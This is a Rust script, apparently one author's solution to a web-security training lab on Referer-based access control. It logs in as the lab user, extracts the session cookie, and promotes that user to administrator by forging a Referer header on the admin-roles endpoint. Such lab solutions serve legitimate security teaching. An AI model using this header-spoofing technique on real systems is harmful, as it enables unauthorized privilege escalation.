/*************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 5/9/2023
*
* Lab: Referer-based access control
*
* Steps: 1. Login as wiener
*        2. Upgrade wiener to be an admin by adding Referer header
*
**************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a8000f4035062ed83c7109600dd003d.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    print!("{} ", "1. Logging in as wiener..".white());
    io::stdout().flush();

    // login as wiener
    let login = client
        .post(format!("{url}/login"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
        ]))
        .send()
        .expect(&format!("{}", "[!] Failed to login as wiener".red()));

    // extract session cookie
    let session = extract_session_cookie(login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    println!("{}", "OK".green());
    print!(
        "{} ",
        "2. Upgrading wiener to be an admin by adding Referer header..".white()
    );
    io::stdout().flush();

    // upgrade wiener to be an admin by adding Referer header
    let upgrade_wiener = client
        .get(format!("{url}/admin-roles?username=wiener&action=upgrade"))
        .header("Cookie", format!("session={session}"))
        .header("Referer", format!("{url}/admin"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to upgrade wiener to be an admin".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}
